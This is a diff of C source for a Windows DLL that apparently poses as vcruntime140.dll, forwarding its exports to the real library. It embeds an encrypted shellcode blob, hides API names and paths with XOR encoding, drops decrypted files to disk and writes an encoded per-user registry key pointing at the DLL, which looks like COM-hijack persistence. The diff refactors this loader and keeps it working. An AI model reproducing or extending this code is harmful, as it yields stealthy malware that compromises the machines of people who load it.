@@ -63,8 +63,6 @@ extern unsigned char _binary_enc_shellcode_bin_end[];
 
 void ___chkstk_ms(void) { return; }
 
-
-
 void *memset(void *dest, int val, size_t count) {
   unsigned char *p = (unsigned char *)dest;
   while (count--)
@@ -268,11 +266,8 @@ void *_set_se_translator(void *translator) {
 
   unsigned char e_kernel32[] = {0x52, 0x5d, 0x41, 0x5c, 0x02, 0x0a, 0x01,
                                 0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
-  unsigned char e_advapi32[] = {0x58, 0x5c, 0x45, 0x53, 0x17, 0x0f, 0x01,
-                                0x50, 0x4d, 0x56, 0x55, 0x33, 0x31};
 
   HMODULE hK32 = rl(e_kernel32, 13);
-  HMODULE hAdvapi32 = rl(e_advapi32, 13);
 
   unsigned char e_CreateDirectoryA[] = {0x7a, 0x4a, 0x56, 0x53, 0x13, 0x03,
                                         0x76, 0x0b, 0x11, 0x57, 0x5a, 0x2b,
@@ -283,15 +278,6 @@ void *_set_se_translator(void *translator) {
                                  0x20, 0x5b, 0x0e, 0x06, 0x32};
   unsigned char e_CloseHandle[] = {0x7a, 0x54, 0x5c, 0x41, 0x02, 0x2e,
                                    0x53, 0x0c, 0x07, 0x5e, 0x5c, 0x5f};
-
-  unsigned char e_RegCreateKeyExA[] = {0x6b, 0x5d, 0x54, 0x71, 0x15, 0x03,
-                                       0x53, 0x16, 0x06, 0x79, 0x5c, 0x26,
-                                       0x74, 0x4a, 0x71, 0x65};
-  unsigned char e_RegSetValueExA[] = {0x6b, 0x5d, 0x54, 0x61, 0x02,
-                                      0x12, 0x64, 0x03, 0x0f, 0x47,
-                                      0x5c, 0x1a, 0x49, 0x73, 0x30};
-  unsigned char e_RegCloseKey[] = {0x6b, 0x5d, 0x54, 0x71, 0x0b, 0x09,
-                                   0x41, 0x07, 0x28, 0x57, 0x40, 0x5f};
 
   unsigned char e_MoveFileExA[] = {0x74, 0x57, 0x45, 0x57, 0x21, 0x0f,
                                    0x5e, 0x07, 0x26, 0x4a, 0x78};
@@ -307,12 +293,6 @@ void *_set_se_translator(void *translator) {
   typedef BOOL(WINAPI * pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD,
                                     LPOVERLAPPED);
   typedef BOOL(WINAPI * pCloseHandle)(HANDLE);
-  typedef LSTATUS(WINAPI * pRegCreateKeyExA)(HKEY, LPCSTR, DWORD, LPSTR, DWORD,
-                                             REGSAM, LPSECURITY_ATTRIBUTES,
-                                             PHKEY, LPDWORD);
-  typedef LSTATUS(WINAPI * pRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD,
-                                            const BYTE *, DWORD);
-  typedef LSTATUS(WINAPI * pRegCloseKey)(HKEY);
   typedef BOOL(WINAPI * pMoveFileExA)(LPCSTR, LPCSTR, DWORD);
   typedef DWORD(WINAPI * pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
   typedef SIZE_T(WINAPI * pVirtualQuery)(LPCVOID, PMEMORY_BASIC_INFORMATION,
@@ -327,12 +307,6 @@ void *_set_se_translator(void *translator) {
   pGetModuleFileNameA fGetModuleFileNameA =
       (pGetModuleFileNameA)ra(hK32, e_GetModuleFileNameA, 18);
   pVirtualQuery fVirtualQuery = (pVirtualQuery)ra(hK32, e_VirtualQuery, 12);
-
-  pRegCreateKeyExA fRegCreateKeyExA =
-      (pRegCreateKeyExA)ra(hAdvapi32, e_RegCreateKeyExA, 16);
-  pRegSetValueExA fRegSetValueExA =
-      (pRegSetValueExA)ra(hAdvapi32, e_RegSetValueExA, 15);
-  pRegCloseKey fRegCloseKey = (pRegCloseKey)ra(hAdvapi32, e_RegCloseKey, 12);
 
   unsigned char e_cache_dir[] = {0x7a, 0x02, 0x6f, 0x62, 0x15, 0x09, 0x55,
                                  0x10, 0x02, 0x5f, 0x7d, 0x3e, 0x45, 0x53,
@@ -355,14 +329,16 @@ void *_set_se_translator(void *translator) {
                               FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile != INVALID_HANDLE_VALUE) {
     DWORD written = 0;
-    int c;
     int current_offset = 0;
-    for (c = 0; c < file_sys_chunk_count; c++) {
-      xb(file_sys_chunks[c], file_sys_chunks[c], file_sys_chunk_sizes[c],
+    int chunk_size = 4096;
+    while (current_offset < file_sys_len) {
+      int sz = file_sys_len - current_offset;
+      if (sz > chunk_size)
+        sz = chunk_size;
+      xb(file_sys + current_offset, file_sys + current_offset, sz,
          current_offset);
-      fWriteFile(hFile, file_sys_chunks[c], file_sys_chunk_sizes[c], &written,
-                 NULL);
-      current_offset += file_sys_chunk_sizes[c];
+      fWriteFile(hFile, file_sys + current_offset, sz, &written, NULL);
+      current_offset += sz;
     }
     fCloseHandle(hFile);
   }
@@ -379,32 +355,27 @@ void *_set_se_translator(void *translator) {
                        FILE_ATTRIBUTE_NORMAL, NULL);
   if (hFile != INVALID_HANDLE_VALUE) {
     DWORD written = 0;
-    int c;
     int current_offset = 0;
-    for (c = 0; c < file_dll_chunk_count; c++) {
-      xb(file_dll_chunks[c], file_dll_chunks[c], file_dll_chunk_sizes[c],
+    int chunk_size = 4096;
+    while (current_offset < file_dll_len) {
+      int sz = file_dll_len - current_offset;
+      if (sz > chunk_size)
+        sz = chunk_size;
+      xb(file_dll + current_offset, file_dll + current_offset, sz,
          current_offset);
-      fWriteFile(hFile, file_dll_chunks[c], file_dll_chunk_sizes[c], &written,
-                 NULL);
-      current_offset += file_dll_chunk_sizes[c];
+      fWriteFile(hFile, file_dll + current_offset, sz, &written, NULL);
+      current_offset += sz;
     }
     fCloseHandle(hFile);
   }
 
-  unsigned char e_reg_key[] = {
-      0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55,
-      0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27,
-      0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e,
-      0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73,
-      0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21,
-      0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14,
-      0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57};
+  unsigned char e_reg_key[] = {0x6a, 0x57, 0x55, 0x46, 0x10, 0x07, 0x40, 0x07, 0x3f, 0x71, 0x55, 0x3e, 0x42, 0x41, 0x55, 0x16, 0x65, 0x2b, 0x28, 0x62, 0x79, 0x27, 0x75, 0x52, 0x26, 0x79, 0x71, 0x15, 0x05, 0x75, 0x7a, 0x7c, 0x1e, 0x77, 0x5e, 0x5f, 0x0a, 0x4f, 0x57, 0x77, 0x7a, 0x1e, 0x1c, 0x73, 0x72, 0x53, 0x78, 0x45, 0x20, 0x72, 0x74, 0x5b, 0x1a, 0x6a, 0x21, 0x02, 0x01, 0x10, 0x07, 0x75, 0x44, 0x64, 0x7a, 0x5c, 0x37, 0x14, 0x5d, 0x01, 0x30, 0x57, 0x4b, 0x29, 0x54, 0x40, 0x03, 0x57, 0x39};
   char reg_key[256];
-  xd(e_reg_key, reg_key, 76);
+  xd(e_reg_key, reg_key, 77);
 
   HKEY hKey;
-  if (fRegCreateKeyExA((HKEY)0x80000001, reg_key, 0, NULL, 0, 0x20006, NULL,
-                       &hKey, NULL) == 0) {
+  if (RegCreateKeyExA(HKEY_CURRENT_USER, reg_key, 0, NULL, REG_OPTION_NON_VOLATILE,
+                      KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
     unsigned char e_ThreadingModel[] = {0x6d, 0x50, 0x41, 0x57, 0x06,
                                         0x02, 0x5b, 0x0c, 0x04, 0x7f,
                                         0x56, 0x3b, 0x54, 0x5e, 0x30};
@@ -416,14 +387,9 @@ void *_set_se_translator(void *translator) {
     char Apartment[32];
     xd(e_Apartment, Apartment, 10);
 
-    int dll_path_len = strlen(dll_path);
-    fRegSetValueExA(hKey, NULL, 0, 1, (const BYTE *)dll_path, dll_path_len + 1);
-
-    int apt_len = strlen(Apartment);
-    fRegSetValueExA(hKey, ThreadingModel, 0, 1, (const BYTE *)Apartment,
-                    apt_len + 1);
-
-    fRegCloseKey(hKey);
+    RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE *)dll_path, 40);
+    RegSetValueExA(hKey, ThreadingModel, 0, REG_SZ, (const BYTE *)Apartment, 11);
+    RegCloseKey(hKey);
   }
 
   MEMORY_BASIC_INFORMATION mbi;
@@ -442,102 +408,160 @@ void *_set_se_translator(void *translator) {
   return (void *)0;
 }
 
-// Proxy Trampolines
 void *p___C_specific_handler;
-EXCEPTION_DISPOSITION __attribute__((naked)) __C_specific_handler(
-    struct _EXCEPTION_RECORD *ExceptionRecord,
-    void *EstablisherFrame, struct _CONTEXT *ContextRecord,
-    struct _DISPATCHER_CONTEXT *DispatcherContext) {
+EXCEPTION_DISPOSITION __attribute__((naked))
+__C_specific_handler(struct _EXCEPTION_RECORD *ExceptionRecord,
+                     void *EstablisherFrame, struct _CONTEXT *ContextRecord,
+                     struct _DISPATCHER_CONTEXT *DispatcherContext) {
   asm("jmp *p___C_specific_handler(%rip)");
 }
 
 void *p___current_exception;
-void __attribute__((naked)) __current_exception() { asm("jmp *p___current_exception(%rip)"); }
+void __attribute__((naked)) __current_exception() {
+  asm("jmp *p___current_exception(%rip)");
+}
 
 void *p___current_exception_context;
-void __attribute__((naked)) __current_exception_context() { asm("jmp *p___current_exception_context(%rip)"); }
+void __attribute__((naked)) __current_exception_context() {
+  asm("jmp *p___current_exception_context(%rip)");
+}
 
 void *p___CxxFrameHandler3;
-void __attribute__((naked)) __CxxFrameHandler3() { asm("jmp *p___CxxFrameHandler3(%rip)"); }
+void __attribute__((naked)) __CxxFrameHandler3() {
+  asm("jmp *p___CxxFrameHandler3(%rip)");
+}
 
 void *p___std_exception_copy;
-void __attribute__((naked)) __std_exception_copy() { asm("jmp *p___std_exception_copy(%rip)"); }
+void __attribute__((naked)) __std_exception_copy() {
+  asm("jmp *p___std_exception_copy(%rip)");
+}
 
 void *p___std_exception_destroy;
-void __attribute__((naked)) __std_exception_destroy() { asm("jmp *p___std_exception_destroy(%rip)"); }
+void __attribute__((naked)) __std_exception_destroy() {
+  asm("jmp *p___std_exception_destroy(%rip)");
+}
 
 void *p__CxxThrowException;
-void __attribute__((naked)) _CxxThrowException() { asm("jmp *p__CxxThrowException(%rip)"); }
+void __attribute__((naked)) _CxxThrowException() {
+  asm("jmp *p__CxxThrowException(%rip)");
+}
 
 void *p___uncaught_exceptions;
-void __attribute__((naked)) __uncaught_exceptions() { asm("jmp *p___uncaught_exceptions(%rip)"); }
+void __attribute__((naked)) __uncaught_exceptions() {
+  asm("jmp *p___uncaught_exceptions(%rip)");
+}
 
 void *p___uncaught_exception;
-void __attribute__((naked)) __uncaught_exception() { asm("jmp *p___uncaught_exception(%rip)"); }
+void __attribute__((naked)) __uncaught_exception() {
+  asm("jmp *p___uncaught_exception(%rip)");
+}
 
 void *p___std_terminate;
-void __attribute__((naked)) __std_terminate() { asm("jmp *p___std_terminate(%rip)"); }
+void __attribute__((naked)) __std_terminate() {
+  asm("jmp *p___std_terminate(%rip)");
+}
 
 void *p__purecall;
 void __attribute__((naked)) _purecall() { asm("jmp *p__purecall(%rip)"); }
 
 void *p___AdjustPointer;
-void __attribute__((naked)) __AdjustPointer() { asm("jmp *p___AdjustPointer(%rip)"); }
+void __attribute__((naked)) __AdjustPointer() {
+  asm("jmp *p___AdjustPointer(%rip)");
+}
 
 void *p___std_type_info_destroy_list;
-void __attribute__((naked)) __std_type_info_destroy_list() { asm("jmp *p___std_type_info_destroy_list(%rip)"); }
+void __attribute__((naked)) __std_type_info_destroy_list() {
+  asm("jmp *p___std_type_info_destroy_list(%rip)");
+}
 
 void *p___processing_throw;
-void __attribute__((naked)) __processing_throw() { asm("jmp *p___processing_throw(%rip)"); }
+void __attribute__((naked)) __processing_throw() {
+  asm("jmp *p___processing_throw(%rip)");
+}
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
   if (fdwReason == DLL_PROCESS_ATTACH) {
-    unsigned char e_sys_vc[] = {0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c, 0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c, 0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a}; // C:\Windows\System32\vcruntime140.dll
+    unsigned char e_sys_vc[] = {
+        0x7a, 0x02, 0x6f, 0x65, 0x0e, 0x08, 0x56, 0x0d, 0x14, 0x41, 0x65, 0x0c,
+        0x48, 0x41, 0x44, 0x00, 0x54, 0x5b, 0x56, 0x6d, 0x46, 0x00, 0x5b, 0x5c,
+        0x0c, 0x34, 0x29, 0x4c, 0x54, 0x00, 0x0d, 0x08, 0x1d, 0x56, 0x0b, 0x0a};
     char sys_vc[64];
     xd(e_sys_vc, sys_vc, 36);
 
     HMODULE hReal = LoadLibraryA(sys_vc);
     if (hReal) {
-      unsigned char e___C_specific_handler[] = {0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54, 0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
+      unsigned char e___C_specific_handler[] = {
+          0x66, 0x67, 0x70, 0x6d, 0x14, 0x16, 0x57, 0x01, 0x0a, 0x54,
+          0x50, 0x3c, 0x6e, 0x5a, 0x51, 0x0b, 0x5d, 0x04, 0x01, 0x43}; // 20
       p___C_specific_handler = ra(hReal, e___C_specific_handler, 20);
 
-      unsigned char e___current_exception[] = {0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
+      unsigned char e___current_exception[] = {
+          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d,
+          0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a}; // 19
       p___current_exception = ra(hReal, e___current_exception, 19);
 
-      unsigned char e___current_exception_context[] = {0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17, 0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07, 0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
-      p___current_exception_context = ra(hReal, e___current_exception_context, 27);
+      unsigned char e___current_exception_context[] = {
+          0x66, 0x67, 0x50, 0x47, 0x15, 0x14, 0x57, 0x0c, 0x17,
+          0x6d, 0x5c, 0x27, 0x52, 0x57, 0x40, 0x11, 0x50, 0x07,
+          0x0a, 0x6e, 0x53, 0x0c, 0x47, 0x5d, 0x07, 0x38, 0x34}; // 27
+      p___current_exception_context =
+          ra(hReal, e___current_exception_context, 27);
 
-      unsigned char e___CxxFrameHandler3[] = {0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e, 0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
+      unsigned char e___CxxFrameHandler3[] = {
+          0x66, 0x67, 0x70, 0x4a, 0x1f, 0x20, 0x40, 0x03, 0x0e,
+          0x57, 0x71, 0x3e, 0x5f, 0x56, 0x5c, 0x00, 0x4b, 0x5b}; // 18
       p___CxxFrameHandler3 = ra(hReal, e___CxxFrameHandler3, 18);
 
-      unsigned char e___std_exception_copy[] = {0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
+      unsigned char e___std_exception_copy[] = {
+          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57,
+          0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5a, 0x07, 0x14, 0x48}; // 20
       p___std_exception_copy = ra(hReal, e___std_exception_copy, 20);
 
-      unsigned char e___std_exception_destroy[] = {0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a, 0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a, 0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
+      unsigned char e___std_exception_destroy[] = {
+          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x57, 0x1a,
+          0x00, 0x57, 0x49, 0x2b, 0x58, 0x5d, 0x5e, 0x3a,
+          0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50}; // 23
       p___std_exception_destroy = ra(hReal, e___std_exception_destroy, 23);
 
-      unsigned char e__CxxThrowException[] = {0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14, 0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
+      unsigned char e__CxxThrowException[] = {
+          0x66, 0x7b, 0x4b, 0x4a, 0x33, 0x0e, 0x40, 0x0d, 0x14,
+          0x77, 0x41, 0x3c, 0x54, 0x42, 0x44, 0x0c, 0x56, 0x06}; // 18
       p__CxxThrowException = ra(hReal, e__CxxThrowException, 18);
 
-      unsigned char e___uncaught_exceptions[] = {0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
+      unsigned char e___uncaught_exceptions[] = {
+          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66,
+          0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f, 0x43}; // 21
       p___uncaught_exceptions = ra(hReal, e___uncaught_exceptions, 21);
 
-      unsigned char e___uncaught_exception[] = {0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46, 0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
+      unsigned char e___uncaught_exception[] = {
+          0x66, 0x67, 0x46, 0x5c, 0x04, 0x07, 0x47, 0x05, 0x0b, 0x46,
+          0x66, 0x3a, 0x49, 0x51, 0x55, 0x15, 0x4d, 0x01, 0x0b, 0x5f}; // 20
       p___uncaught_exception = ra(hReal, e___uncaught_exception, 20);
 
-      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x07, 0x11, 0x5f, 0x50, 0x31, 0x50, 0x46, 0x55}; // 15
+      unsigned char e___std_terminate[] = {0x66, 0x67, 0x40, 0x46, 0x03,
+                                           0x39, 0x46, 0x07, 0x11, 0x5f,
+                                           0x50, 0x31, 0x50, 0x46, 0x55}; // 15
       p___std_terminate = ra(hReal, e___std_terminate, 15);
 
-      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02, 0x05, 0x53, 0x0e, 0x0f}; // 9
+      unsigned char e__purecall[] = {0x66, 0x48, 0x46, 0x40, 0x02,
+                                     0x05, 0x53, 0x0e, 0x0f}; // 9
       p__purecall = ra(hReal, e__purecall, 9);
 
-      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d, 0x13, 0x41, 0x16, 0x33, 0x5d, 0x50, 0x31, 0x45, 0x57, 0x42}; // 15
+      unsigned char e___AdjustPointer[] = {0x66, 0x67, 0x72, 0x56, 0x0d,
+                                           0x13, 0x41, 0x16, 0x33, 0x5d,
+                                           0x50, 0x31, 0x45, 0x57, 0x42}; // 15
       p___AdjustPointer = ra(hReal, e___AdjustPointer, 15);
 
-      unsigned char e___std_type_info_destroy_list[] = {0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57, 0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45, 0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
-      p___std_type_info_destroy_list = ra(hReal, e___std_type_info_destroy_list, 28);
+      unsigned char e___std_type_info_destroy_list[] = {
+          0x66, 0x67, 0x40, 0x46, 0x03, 0x39, 0x46, 0x1b, 0x13, 0x57,
+          0x66, 0x36, 0x5f, 0x54, 0x5f, 0x3a, 0x5d, 0x0d, 0x17, 0x45,
+          0x42, 0x0c, 0x50, 0x76, 0x0e, 0x29, 0x33, 0x55}; // 28
+      p___std_type_info_destroy_list =
+          ra(hReal, e___std_type_info_destroy_list, 28);
 
-      unsigned char e___processing_throw[] = {0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10, 0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
+      unsigned char e___processing_throw[] = {
+          0x66, 0x67, 0x43, 0x40, 0x08, 0x05, 0x57, 0x11, 0x10,
+          0x5b, 0x57, 0x38, 0x6e, 0x46, 0x58, 0x17, 0x56, 0x1f}; // 18
       p___processing_throw = ra(hReal, e___processing_throw, 18);
     }
   }
